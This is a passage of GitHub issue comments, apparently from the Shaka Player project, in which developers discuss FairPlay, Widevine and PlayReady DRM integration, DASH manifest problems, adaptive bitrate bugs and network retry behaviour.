I thought better than nothing until I can get permissions to share the urls with you guys. ",
    "kidmiracleman": "@chrisfillmore Any reason why you need to use  com.apple.fps.2_0 rather than  com.apple.fps.1_0.\nThe Apple FairPlay example app uses the latter keysystem - however I do notice that most of the functionality seems to be embedded underneath the video tag (Not exposed via MSE). @joeyparrish - can this be reopened?  The intent of this ticket is to highlight a potential issue with persistentState and dependent provider_client_token feature of Widevine.\n. Thanks for looking at this Joey,\nI am concerned mainly with using a different key for audio/video as per the guidelines...\nI assume you are referring to the initData 'filtering' logic in  drm_engine.js?\nif we only add a content_id to our Widevine PSSH payload  is this enough to trigger this logic? it seems from looking at content_protection.js  that 'cenc' compliant content protection elements have the entire PSSH set as the initData?  so If the keyIDs  (in the PSSH header)are different  the initdata will be different ?\nOr do we need to put the same KeyID in the PSSH header regardless?\n. Hi,\nYou can close this.  Thank you for the help!\n. Hi Joey,\nI see you mention key-system specific data - and the 1 to many key delivery approach based on contentId (Widevine example).\nIs it possible that you could also allow the MediaKeySession filtering to be done based on the initdata payload  (only)?\nExample:\nMPD containing HD, SD and Audio adaptionsets - all different default keyids\ninitdata made up of V1 PSSH header and keysystem payload for each track.  Again this data will be distinct for each adaptionset due to the unique KeyId being present in the header\nFilter based on  inittdata payload (strip the header )(this could be configurable option) -  if the keysystem specific payload is the same (hash) then we know that the MediaKeySession can be shared between these adaptionsets - otherwise we need a new MediaKeySession.. \nI realise that you might say this is a little specific, but I think it could be considered a generic solution for DRMs that implement (or allow implementation) of key management at a higher level of abstraction than standard CENC keyid->key 1 to 1 mapping.\nFinally a question...\nIn which cases to you expect the extended filter criteria defined in the OP to be applied (that are not already caught today>).  The the best of my knowledge if the keyId is distinct then the initdata will be distinct for most DRMs.\nIn fact, if a V1 PSSH is used (as per the spec), then this distinctiveness is guaranteed is it not? \nThanks,\nKarl.. Hi Joey,\nYes this somewhat explains the reasoning.\nWhat I still don't understand is how we could have unique Initdata's that encapsulate or reference the same keyID?  Based on my knowledge of a number of DRM systems  - I can't see why/how anyone would want (or be able to) produce such a PSSH configuration.\nOn my other point  - by stripping the PSSH down to the key system specific part   - what you get is the ability for the DRM solution vendor to intentionally make the (stripped) initdata unique / non-unique, since the standard mean that (implicitly) there will be a unique PSSH for each keyId (regardless of DRM system)\nI get the fact that you may not want to 'delve' to deep into vendor specifics in a generic player app however.. Thanks Joey,\nThe spec(s) are available from here : https://www.smpte.org/standards\nIs there any way I can send you a content link privately?\n. email sent.. ",
    "barbarosalp": "Hi @joeyparrish,\nCould you guys have a time to work on this lately?\nThanks.\n. Hi @chrisfillmore, there is an Apple provided code example for fairplay. If you don't have it, I can send them.. ",
    "karlg-arris": "@chrisfillmore I took the liberty of briefly reviewing this change.\nThe only comment I have (for now) is that there seems to be some application specific logic embedded  within the generic library implementation.\nThis is concerning license acquisition from a remote KSM and subsequent response parsing. For other DRM systems the application developer is simply handed off raw bytes by Shaka, which you can then chose to prepare yourself via a network 'hook'  - e.g. the developer is free to chose their own request format (URI encode, HTTP header..etc)\nThe same applies for response parsing  - Shaka expects an ArrayBuffer to be returned, but the application is free to use a custom response format (and add the appropriate parsing hook). Sorry @chrisfillmore  - thanks for clarifying !. @chrisfillmore There is no KEYFORMAT defined for PlayReady by Microsoft.\nAs @sandersaares has said #EXT-X-PLAYREADYHEADER is the way to signal PlayReady DRM on HLS.\nThe header data is a PlayReady Header Object (PRHO).  The implementation will probably need to extract this and wrap it in a PSSH box (I think).\nHere is an example stream: http://playready.directtaps.net/media/hls/tosh2641080aacenc/tears_of_steel_1080p-m3u8-aapl.ism/manifest(format=m3u8-aapl). Hi,\nThe Chromecast Gen1 device reports itself as not supporting HDCP validation - at least I can see this in our Widevine proxy logs, therefore it would be expected that playback fails.. @joeyparrish  The Google ExoPlayer for Android implements similar behaviour.  In the event of a 404 error it will retry on the same fragment for a fixed retry count. Once retries are exhausted it will move down to the next bitrate and so on.  ExoPlayer temporarily blacklists any representation that causes a the max retries to be exceeded (excluding the lowest bitrate representation), to avoid the ABR trying to select bitrates that are currently experiencing errors.. ",
    "jesteross": "Hi All\nThanks all contributors for great work!\nCould you please say, is it planned FairPlay support?\nAnd maybe some approximate date?. ",
    "htleeab": "@chrisfillmore My company is trying to play Hls-fps. The hls streams of my company have not pssh boxes and webkitneedkey return 149 bytes data. I extracted the key id(=content id) from playlist to simulate the initData like fps.1_0. License server can return CKC message but the video cannot play. \nI'm wondering the initData of fps.2_0 is different from fps.1_0. Could you please tell me what is the correct value and pattern of initData from webkitneedkey? or is there any workable sample for fps.2_0 or fps.3_0? \nThank you.. @chrisfillmore \nThank for the reply.\nMy colleague generated a hls + fairplay stream with pssh box. \nThe initData return from webkitKeyMessage is array of char code of stringified json of sinf box\n{\"sinf\" : [    \"AAAADGZybWFtcDRhAAAAFHNjaG0AAAAAY2JjcwABAAAAAAA5c2NoaQAAADF0ZW5jAQAAAAAAAQDJyuv\\/nVBJRoJ1xpgf1uGcEDBBHQdj5UTQu8Xqnj8si+U=\"  ]}\nthe value of sinf is 64 encoded sinf box. \nSafari can handle both above sinf box and the initData of fps.1_0 ( string of skd url with length padded to multiple of 16 bytes).\nWhen load source with video and audio stream, one of the key will be added and the another one will throw webkitkeyerror, no matter if the keys are same or not. Also, the session ids are empty. \nBut when there is only one key session (video-only or audio-only), it can play successfully. :D The license server is same as fps.1_0. The SCP and CKC version is 1.\nMy colleague think it may be because the method safari handle the media source. Safari native player only trigger one webkitneedkey event when the keys are same. But most of MSE player with DRM require two sessions.\nApart from that, my colleague generated a CENC fps stream, it cannot be played but it create session with id.\nIt is related to the data of pssh box? Currently we using system_id = [29 70 1f e4 3c c7 4a 34 8c 5b ae 90 c7 43 9a 47]. I fount out that the fps 1 license server I using get the key id outside of SPC without verify with the content of SPC. That maybe the reason that I can get the correct key back and play CBCS video/audio only. The asset id decrypted by license server is the whole input of create session. If I pass the initData as-is, the license server receive the whole sinf box.\nI tested a stream with same key for video and audio. I process the sinf box returned from webkitneedkey and extract key id to create session so that there is only one session and safari generates SPC with key id that match the fps1 license server I using. The key added correctly without error, but the video is stalling and cannot play.\nMaybe the system id only for CENC(CTR) and the data stored in the pssh box of init segment have some impact. I cannot test CENC stream since it requires IV with different length and it requires to modify the license server. . ",
    "fadomire": "dont mean to put any pressure (as if i could) but is Fairplay DRM support still planned for 2.5 ?\ni know it is blocked by #816 \nif i can be of any help to make Fairplay DRM work just let me know. is #816 scheduled for v2.5 ?. thanks for the reply\nit may be interesting to check how dashjs made their implementation when the subject come in the roadmap\none thread discussing low latency specifics :\nhttps://github.com/Dash-Industry-Forum/dash.js/issues/1474. yes sure i\u2019ll prepare a PR in the following weeks. this seems less easy than i first thought because of the following flow: \nspecific config overrides default value and is then passed to manifest parsers\nso when the parser get the dash manifest minBufferTime it does not know if the config value is the default one or a specific config one\ni can think of some hack around it, but i don't like that\ni'll need more time to come with a proper solution if any, so i'll let you know\nideas welcome. @vaage thanks for the suggestion, it seems a good path\ni still made a pull request with minor changes, but i feel it does not fit well with the current code flow : \ndefault config merged with specific user config\ntho i will use this fork for demo purpose and see later how shaka team wants to implement it. i updated the PR #1581 to implement manifest.dash.ignoreMinBufferTime logic\nlet me know if ok for you or if it needs some tweak\nthanks !. I signed it!. i added 2 tests for ignoreMinBufferTime\n- one to check that when ignoreMinBufferTime is true minBufferTime is 0\n- another to verify when it is false it should respect manifest minBufferTime\ndont know if the second one is necessary or if it is already tested somehow. i had a similar issue, maybe it is not the same case but i had the startAtSegmentBoundary option set to true. i'm not yet sure on how to write a test properly but will check it later on. definitly help, thanks. ",
    "l-law": "Sorry there is one attribute put in the wrong place in the uploaded mpd, in Event tag, \"timescale\" should not be put there but should be put in EventStream.\nCorrect mpd should look like this:\n<EventStream timescale=\"10000000\" schemeIdUri=\"urn:scte:scte35:2014:xml+bin\">\n            <Event presentationTime=\"60000000\" duration=\"100000000\" id=\"1\">\n                <scte35:Signal>\n                    <scte35:Binary>\n                        /DAvAAAAAAAA///wFAVAAAABf+/+A5OHAP4F9eEAADwAAAAKAAhDVUVJAAAAAECJXy8=\n                    </scte35:Binary>\n                </scte35:Signal>\n            </Event>\n        </EventStream>\nBut this doesn't affect the outcome, it will get stuck at period end.\n. Thanks for the information.\nI tried to edit the manifest such that Period 1 to start at 89.061333, then shaka can play through the transition from Period 0 to Period 1. Therefore this \"gap\" should be the main reason that caused playback hang.\nHowever, this \"gap\" only exists in audio streams, for video stream in Period 0 it should end exactly at the time Period 1 starts. If there is only one single period, then all content could be played even if there is \"gap\" between audio and end of period(ie. only video is played in the end). I would expect shaka-player should also play all content in the case with multiple periods.\nHere I have a few questions:\n1. Sometimes adaptation sets have different end time, in order to use shaka-player to smoothly play across periods, period start time should be set to the earliest end time of any adaptation set of previous period?\n2. If there is overlap between periods, will the content be skipped or played?\n3. Will shaka-player support gaps in content in the future?\n. ",
    "medazzo": "yes ,you are completely right ,  sorry for disturb.\n. ",
    "mlondon1": "I am using the demo hosted player (v2.0.0-beta2-debug):\nhttp://shaka-player-demo.appspot.com/demo/\nWe also suspected it was an issue with the clock not properly being UTC.  We will check the encoder settings.  We would still see this issue in a pre 2.0.0-beta2 build right?\n-Thanks,\nMarc\n. Hi, This is encrypted premium content, is there anything else that I can provide?  Or do you not need to play the content and just want to look at the MPD?\n. You're welcome\n. Yes compiled loads much faster.  thanks\n. We are still seeing this with the Widevine UAT environment, but not production. We reached out to our Widevine contacts, i just wanted to update the ticket.  It works in production, which is good.. Thanks, any chance you could provide a little more detail?. Thanks, any chance you could provide a little more detail?. I was going to use Headless Chrome, but that seemed like a lot of overhead to run a whole browser so I started writing my own Dash parser in Python.\nI am not a JavaScript expert so I had trouble getting the Shaka tests running to parse the live Dash stream as the code is complex.\nIf one of the Shaka developers could give general steps to run the test and stub/mock the non-essential components that might help, but not sure how much effort that is.\n\nOn Aug 3, 2017, at 9:05 AM, U Dinesh notifications@github.com wrote:\nHi @mlondon1 , I'm also searching for similar solution. Did you find solution for this? i would like to know your status on this. Please let me know if you found any alternative solution.\nThanks\nDinesh\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. I was going to use Headless Chrome, but that seemed like a lot of overhead to run a whole browser so I started writing my own Dash parser in Python.\n\nI am not a JavaScript expert so I had trouble getting the Shaka tests running to parse the live Dash stream as the code is complex.\nIf one of the Shaka developers could give general steps to run the test and stub/mock the non-essential components that might help, but not sure how much effort that is.\n\nOn Aug 3, 2017, at 9:05 AM, U Dinesh notifications@github.com wrote:\nHi @mlondon1 , I'm also searching for similar solution. Did you find solution for this? i would like to know your status on this. Please let me know if you found any alternative solution.\nThanks\nDinesh\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Yes thanks.  You can close this.\nOn Sep 26, 2017, at 10:49 PM, Joey Parrish notifications@github.com wrote:\nDASH manifests are updated based on the update period in the manifest. Headers have no influence over that.\nIf the server sends headers stating that the manifest should be cached, then the browser will cache them and will serve us the cached response. We have no way to know if responses are served from cache or not.\n@mlondon1, does this answer your question?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Thanks, on a related note do you also support the Playready 4.0 Header in manifests when running on Edge?\n\nhttps://docs.microsoft.com/en-us/playready/packaging/content-encryption-modes. Ok thanks, we'll test.  you can close. ",
    "tab1293": "Can somebody please elaborate on what it means to add a UTCTiming element and how to configure a clockSyncUri? Is setting the clockSyncUri as simple as player.configure({ clockSyncUri: [uri] }); ? Should that URI point to the same server the player is hosted on? Also is the UTCTiming element something that needs to be added to my manifest? Why are these two things needed?\nI am getting these warnings from the player:\n(video:1) cannot find segment: currentPeriod.startTime=0 lookupTime=25453.112666654586\n(audio:5) cannot find segment: currentPeriod.startTime=0 lookupTime=25454.111666727065\nSometimes after multiple refreshes of my player test page, the stream will load, but it is very inconsistent. \nHere is what my manifest looks like\nxml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<MPD \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n    xmlns=\"urn:mpeg:dash:schema:mpd:2011\" \n    xsi:schemaLocation=\"urn:mpeg:DASH:schema:MPD:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\" \n    profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" \n    type=\"dynamic\" \n    minBufferTime=\"PT4.7S\" \n    suggestedPresentationDelay=\"PT4S\" \n    minimumUpdatePeriod=\"PT4S\" \n    availabilityStartTime=\"2016-06-15T07:59:02\" \n    publishTime=\"2016-06-15T08:02:44\">\n  <Period start=\"PT0.0S\">\n    <AdaptationSet contentType=\"video\" segmentAlignment=\"true\" bitstreamSwitching=\"true\">\n      <Representation id=\"360p-video\" mimeType=\"video/mp4\" codecs=\"avc1.4d401e\" width=\"640\" height=\"360\" frameRate=\"30/1\">\n        <SegmentTemplate timescale=\"15360\" initialization=\"360p/init-stream0.m4s\" media=\"360p/chunk-stream0-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"77312\"/>\n            <S d=\"122880\"/>\n            <S d=\"44032\"/>\n            <S d=\"114176\"/>\n            <S d=\"98304\"/>\n            <S d=\"128000\"/>\n            <S d=\"46080\"/>\n            <S d=\"20480\"/>\n            <S d=\"66560\"/>\n            <S d=\"94208\"/>\n            <S d=\"128000\"/>\n            <S d=\"31744\"/>\n            <S d=\"67072\"/>\n            <S d=\"40448\"/>\n            <S d=\"164864\"/>\n            <S d=\"41984\"/>\n            <S d=\"96768\"/>\n            <S d=\"27136\"/>\n            <S d=\"84480\"/>\n            <S d=\"63488\"/>\n            <S d=\"66560\"/>\n            <S d=\"80896\"/>\n            <S d=\"93184\"/>\n            <S d=\"53248\"/>\n            <S d=\"88064\"/>\n            <S d=\"80896\"/>\n            <S d=\"95232\"/>\n            <S d=\"67584\"/>\n            <S d=\"100352\"/>\n            <S d=\"33280\"/>\n            <S d=\"128000\" r=\"1\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n      <Representation id=\"540p-video\" mimeType=\"video/mp4\" codecs=\"avc1.64001f\" width=\"960\" height=\"540\" frameRate=\"30/1\">\n        <SegmentTemplate timescale=\"15360\" initialization=\"540p/init-stream0.m4s\" media=\"540p/chunk-stream0-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"77312\"/>\n            <S d=\"122880\"/>\n            <S d=\"44032\"/>\n            <S d=\"114176\"/>\n            <S d=\"64512\"/>\n            <S d=\"161792\"/>\n            <S d=\"46080\"/>\n            <S d=\"20480\"/>\n            <S d=\"66560\"/>\n            <S d=\"94208\"/>\n            <S d=\"128000\"/>\n            <S d=\"31744\"/>\n            <S d=\"66048\"/>\n            <S d=\"41472\"/>\n            <S d=\"164864\"/>\n            <S d=\"41984\"/>\n            <S d=\"96768\"/>\n            <S d=\"27136\"/>\n            <S d=\"84480\"/>\n            <S d=\"63488\"/>\n            <S d=\"66560\"/>\n            <S d=\"80896\"/>\n            <S d=\"93184\"/>\n            <S d=\"53248\"/>\n            <S d=\"88064\"/>\n            <S d=\"80896\"/>\n            <S d=\"95232\"/>\n            <S d=\"67584\"/>\n            <S d=\"100352\"/>\n            <S d=\"33280\"/>\n            <S d=\"69120\"/>\n            <S d=\"116224\"/>\n            <S d=\"87552\"/>\n            <S d=\"54272\"/>\n            <S d=\"86016\"/>\n            <S d=\"57856\"/>\n            <S d=\"128000\"/>\n            <S d=\"103936\"/>\n            <S d=\"125952\"/>\n            <S d=\"128000\"/>\n            <S d=\"30720\"/>\n            <S d=\"60416\"/>\n            <S d=\"27136\"/>\n            <S d=\"68096\"/>\n            <S d=\"44032\"/>\n            <S d=\"73216\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n      <Representation id=\"144p-video\" mimeType=\"video/mp4\" codecs=\"avc1.4d400d\" width=\"256\" height=\"144\" frameRate=\"30/1\">\n        <SegmentTemplate timescale=\"15360\" initialization=\"144p/init-stream0.m4s\" media=\"144p/chunk-stream0-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"77312\"/>\n            <S d=\"122880\"/>\n            <S d=\"44032\"/>\n            <S d=\"114176\"/>\n            <S d=\"98304\"/>\n            <S d=\"128000\"/>\n            <S d=\"46080\"/>\n            <S d=\"20480\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet contentType=\"audio\" segmentAlignment=\"true\" bitstreamSwitching=\"true\">\n      <Representation id=\"360p-audio\" mimeType=\"audio/mp4\" codecs=\"mp4a.40.2\" bandwidth=\"128000\" audioSamplingRate=\"48000\">\n        <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n        <SegmentTemplate timescale=\"48000\" initialization=\"360p/init-stream1.m4s\" media=\"360p/chunk-stream1-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"238600\"/>\n            <S d=\"384000\"/>\n            <S d=\"138240\"/>\n            <S d=\"356352\"/>\n            <S d=\"307200\"/>\n            <S d=\"400384\"/>\n            <S d=\"143360\"/>\n            <S d=\"64512\"/>\n            <S d=\"207872\"/>\n            <S d=\"293888\"/>\n            <S d=\"400384\"/>\n            <S d=\"99328\"/>\n            <S d=\"209920\"/>\n            <S d=\"125952\"/>\n            <S d=\"515072\"/>\n            <S d=\"131072\"/>\n            <S d=\"303104\"/>\n            <S d=\"83968\"/>\n            <S d=\"264192\"/>\n            <S d=\"198656\"/>\n            <S d=\"207872\"/>\n            <S d=\"252928\"/>\n            <S d=\"290816\"/>\n            <S d=\"166912\"/>\n            <S d=\"275456\"/>\n            <S d=\"252928\"/>\n            <S d=\"296960\"/>\n            <S d=\"210944\"/>\n            <S d=\"314368\"/>\n            <S d=\"103424\"/>\n            <S d=\"400384\"/>\n            <S d=\"399360\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n      <Representation id=\"540p-audio\" mimeType=\"audio/mp4\" codecs=\"mp4a.40.2\" bandwidth=\"256000\" audioSamplingRate=\"48000\">\n        <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n        <SegmentTemplate timescale=\"48000\" initialization=\"540p/init-stream1.m4s\" media=\"540p/chunk-stream1-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"238600\"/>\n            <S d=\"384000\"/>\n            <S d=\"138240\"/>\n            <S d=\"356352\"/>\n            <S d=\"201728\"/>\n            <S d=\"505856\"/>\n            <S d=\"143360\"/>\n            <S d=\"64512\"/>\n            <S d=\"207872\"/>\n            <S d=\"293888\"/>\n            <S d=\"400384\"/>\n            <S d=\"99328\"/>\n            <S d=\"206848\"/>\n            <S d=\"129024\"/>\n            <S d=\"515072\"/>\n            <S d=\"131072\"/>\n            <S d=\"303104\"/>\n            <S d=\"83968\"/>\n            <S d=\"264192\"/>\n            <S d=\"198656\"/>\n            <S d=\"207872\"/>\n            <S d=\"252928\"/>\n            <S d=\"290816\"/>\n            <S d=\"166912\"/>\n            <S d=\"275456\"/>\n            <S d=\"252928\"/>\n            <S d=\"296960\"/>\n            <S d=\"210944\"/>\n            <S d=\"314368\"/>\n            <S d=\"103424\"/>\n            <S d=\"216064\"/>\n            <S d=\"363520\"/>\n            <S d=\"273408\"/>\n            <S d=\"169984\"/>\n            <S d=\"268288\"/>\n            <S d=\"181248\"/>\n            <S d=\"399360\"/>\n            <S d=\"325632\"/>\n            <S d=\"393216\"/>\n            <S d=\"400384\"/>\n            <S d=\"95232\"/>\n            <S d=\"189440\"/>\n            <S d=\"83968\"/>\n            <S d=\"212992\"/>\n            <S d=\"138240\"/>\n            <S d=\"228352\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n      <Representation id=\"144p-audio\" mimeType=\"audio/mp4\" codecs=\"mp4a.40.2\" bandwidth=\"96000\" audioSamplingRate=\"48000\">\n        <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n        <SegmentTemplate timescale=\"48000\" initialization=\"144p/init-stream1.m4s\" media=\"144p/chunk-stream1-$Number%05d$.m4s\" startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"0\" d=\"238600\"/>\n            <S d=\"384000\"/>\n            <S d=\"138240\"/>\n            <S d=\"356352\"/>\n            <S d=\"307200\"/>\n            <S d=\"400384\"/>\n            <S d=\"143360\"/>\n            <S d=\"64512\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>\n. ",
    "LucasPiffer": "worked like a charm. Did you think about create a gem for Shaka?\n. Rails Gem.\n. no problem, just curiousity. thanks again sir. \n. BTW in the tutorial (https://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html) the following code is suggested:\nshaka.Player.support().then(function(support) {\n      // This executes when the asynchronous check is complete.\n      if (support.supported) {\n        // Everything looks good!\n        initPlayer();\n      } else {\n        // This browser does not have the minimum set of APIs we need.\n        console.error('Browser not supported!');\n      }\n    });\nBut looking in the Shaka.player there is no definition to support for the current release. In the demo dir there is a working sample (it has a conditio in load.js which test if the compiled version exists else it uses the uncompiled version.)\n. Maybe the tutorial should adapt to the current version of shaka. Having a look in demo I found:\nshaka.Player.isBrowserSupported()\nwhat seems to be the correct way which should be used in tutorial. \n. thanks. BTW shaka player is amazing! great job. \n. Have a look on it: https://github.com/google/shaka-player/issues/399\nIf you have a look in demo folder you'll find a working example for 2.0.\n. did you check the load.js in the demo?\n. ",
    "Ross-cz": "Issue still persists.\nThere is incompatibility for MSIE 11 inside this part of code:\n// Edge 13 fails this negotiation with NotSupportedError if more than\n          // one entry is given, even if each entry individually would be\n          // supported.  Bug filed: https://goo.gl/vr2Vle\n          if (drmInfo.keySystem == 'com.microsoft.playready' &&\n              **capabilities.length**) {\n            return;\n          }\n          capabilities.push({\n            robustness: robustness,\n            contentType: fullMimeType\n          });\nCode comment is incorrect for the condition and this causes only one video codec selection inside patchedmediakeys_20140218 polyfill.\n. I can confirm same like Tom\u00e1\u0161. I saw that a month ago using same debugging session. At some circumstances AbrManager caches incorrect (highest) values, gets stuck with them and don't process switch call - probably some initialization race condition.\nMy test case:\n1. expand Configuration and disable adaptation\n2. on shaka test page select \"Tears of Steel\"\n3. click Load\n4. cca after 5s enable adaptation\n5. even after 2 minutes nothing adapted...\nI was able to repro it at work & home using Chrome 51.0.2704.103 m.\nCheck race condition status using console:\n1. abr manager\nshakaDemo.player_.defaultAbrManager_.streamsByType_['video'].height\nshakaDemo.player_.defaultAbrManager_.chooseStreams_().video.height\n=> both 944\n2. player switch history\nshakaDemo.player_.switchHistory_.filter(function (a) {return a.type == 'video';}).map(function(a) {return shakaDemo.player_.getTracks().filter(function(b) {return b.id == a.id;})[0].height;})\n=> [124]\n3. abr manager has strange comparisons inside method suggestStreams_ aka related code\n  var oldAudio = this.streamsByType_['audio'];\n  var oldVideo = this.streamsByType_['video'];\n  var chosen = this.chooseStreams_();\n  if (chosen['audio'] != oldAudio || chosen['video'] != oldVideo) {\n    var currentBandwidthKbps =\n        Math.round(this.bandwidthEstimator_.getBandwidthEstimate() / 1000.0);\n    shaka.log.debug(\n        'Calling switch_()...',\n        'bandwidth=' + currentBandwidthKbps + ' kbps');\n    this.switch_(chosen);\n  }\nWhy are there cached values inside managers and not reading actual states?\n. This was captured using Chrome 51.0.2704.103 m.\nCodebase is same.\nI don't have test case for this, but it could be related to DRM expired license key & seeking to the end.\n. Is there demo for short DRM expiring license? (5 min)\nDo I need to check, whether I am seeking to the end and whether video ended, before every change to currentTime?\n. Hi @joeyparrish , I was on holidays.\nI just put if statement (if (this.mediaSource_.readyState !== 'ended')) into code:\nshaka.media.MediaSourceEngine.prototype.endOfStream = function(opt_reason) {\n  return this.enqueueBlockingOperation_(function() {\n    // Chrome won't let me pass undefined, but it will let me omit the\n    // argument.  Firefox does not have this problem.\n    // TODO: File a bug about this.\n    if (this.mediaSource_.readyState !== 'ended') {\n        if (opt_reason) {\n            this.mediaSource_.endOfStream(opt_reason);\n        } else {\n            this.mediaSource_.endOfStream();\n        }\n    }\n  }.bind(this));\n};\nIt could be a fix. I used following info about readyState: https://developer.mozilla.org/en-US/docs/Web/API/MediaSource/readyState\nBtw Chrome (and probably other browsers) don't handle DRM expired licenses - video is streaming, no Error state, no ended state, it just don't play decrypted content... I don't want to create issue on this, because I don't have testing license server with short term licenses for you.\n. Thanks, I was not able to reproduce it again.\n. Thank you for your comment Joey.\nYes, but this is only part of the issue. Let's apply that on the shaka\nplayer UX. When user loses temporary connection, or traffic is bad, he\nget's immediate error during playback. When I change the settings for error\nrepeat, e.g. to unlimited, the user just get rotating wheel, but it should\nnot rotate for ages. In cases, when there are bufferred data available\nduring playback I would expect to get non-fatal error flag and in case of\nbuffer miss fatal error flag. Error code could be same.\nIs it possible to use easily current shaka API / MediaElement API for fatal\ntracking? How to recover from error states (after depleted retries)? Could\nwe have separated TextTrack retries settings?\nI'm sorry for unclear description.\n-ross\nOn Thu, Nov 10, 2016 at 12:18 AM, Joey Parrish notifications@github.com\nwrote:\n\nLet me see if I understand you correctly. Some errors are non-fatal, such\nas HTTP errors, while some are fatal, such as a malformed manifest. You'd\nlike to know which ones are fatal and which ones aren't, so you can avoid\nshowing the user errors they don't care about. Is that accurate? Did I miss\nanything important?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/564#issuecomment-259554984,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AA64wku_ntZKAsOWcqinL4xvQt6LdZsQks5q8lTFgaJpZM4KcCxG\n.\n. Hi Joey!\n\nThanks for the type clarification. We need to do the simple audio detection. If there aren't any audio tracks, we could somehow let users know about it.\nI think its a great idea to just split codecs. Could you add audioChannelsCount too?. Hi Joey,\nthank you for detail logic explanation. I agree with you.\nI just want to add that my issue was with segment request (m4s). :-) There were some unit tests, but it seems the error leaks from HttpPlugin to other layer untested (StreamingEngine - handleNetworkError_).. Hi, last change is too generic and doesn't support real world scenarios, when you want to have robust solution:\n1. service can return 404, when it is being deployed using simple strategy, e.g. no failover or backup secondary service. I would like to have retry support for this.\n2. 403 is just forbidden and 401 means challenge required - both are different and specifc. 401 means stupid configuration or missing cookie. 403 means stupid configuration or provided things expired.\n3. regres VOD timeout and http error is critical too without retry.\n4. handleNetworkError_ was used even for subtitles, now it is not needed anymore.\nAs for the infinity - this works in case of playing buffered data, but after that can you show me user, who is looking 2 mins into rotating wheel? We are fighting with every 10ms latency.. There should be really something more helpfull on the API side - more real world.\nI would like to have ability to retry based on my own logic even critical network errors. This would cover all scenarios:\n stupid backend deployments especially 3rd party\n let user control, e.g. if he just closed his laptop and left video paused on some browser tab..\nI will be able to expand logic like this:\n for stupid servers I want to add user ability to report / retry using button.\n let user know, his session expired, so he needs to relogin / hit play again / buy again, because rent expired, etc.\nOr if you are lazy, reload whole player at that position.. This doesn't help to server stats... Hi Jacob, I would prefer method player.retryStreamLoading(). This gives me freedom for UX logic implementation.\nThank you!. Thanks Joey. I don't keen on the fix. There is probably some incompatibility with cygwin used by python on the Windows.\nMaybe the community can help and rework python scripts to full nodejs project?. I don't understand logical difference between SW_SECURE_CRYPTO and not specifing/throwing error. I thought this is the default on desktops.\nI don't understand why I have to maintain non-understandable compatibility issues between Chrome and Firefox Widevine DRM modules.\nI would expect better support for errors being produced by Widevine DRM / Shaka combination because of same company and possible NDA knowledge sharing. This is Widevine DRM demo player, isn't it?\nDo we need to see this Chrome warning?\ndrm_engine.js:552 It is recommended that a robustness level be specified. Not specifying the robustness level could result in unexpected behavior, potentially including failure to play.. Thank you guys for your great support. Managers will be happy.\nI did sample robustness capability test for SW_SECURE_CRYPTO:\nvar config = null, widevineOptions = [\n { label: 'foo', // For debugging and/or identifying the selected config.\n initDataTypes: ['cenc', 'webm'],\n sessionTypes: ['temporary'],\n audioCapabilities: [\n // Preferred codec.\n { contentType: 'audio/mp4; codecs=\"mp4a.40.5\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n // Next most-preferred codec.\n { contentType: 'audio/mp4; codecs=\"mp4a.40.2\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n // Least preferred codec.\n { contentType: 'audio/webm; codecs=\"vorbis\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n ],\n videoCapabilities: [\n // Preferred codec.\n { contentType: 'video/webm; codecs=\"vp9\"',\n robustness: 'HW_SECURE_ALL'\n },\n { contentType: 'video/webm; codecs=\"vp9\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n // Next most-preferred codec.\n { contentType: 'video/mp4; codecs=\"avc1.640028\"', // high profile\n robustness: 'HW_SECURE_ALL'\n },\n { contentType: 'video/mp4; codecs=\"avc1.640028\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n // Least preferred codec.\n { contentType: 'video/mp4; codecs=\"avc1.4d401e\"', // main profile\n robustness: 'HW_SECURE_ALL'\n },\n { contentType: 'video/mp4; codecs=\"avc1.4d401e\"',\n robustness: 'SW_SECURE_CRYPTO'\n },\n ],\n }\n];\nnavigator.requestMediaKeySystemAccess(\n 'com.widevine.alpha', widevineOptions)\n .then(function(result) {\n keySystemAccess = result;\n config = keySystemAccess.getConfiguration();\n console.log(config);\n });\nChrome: supports - 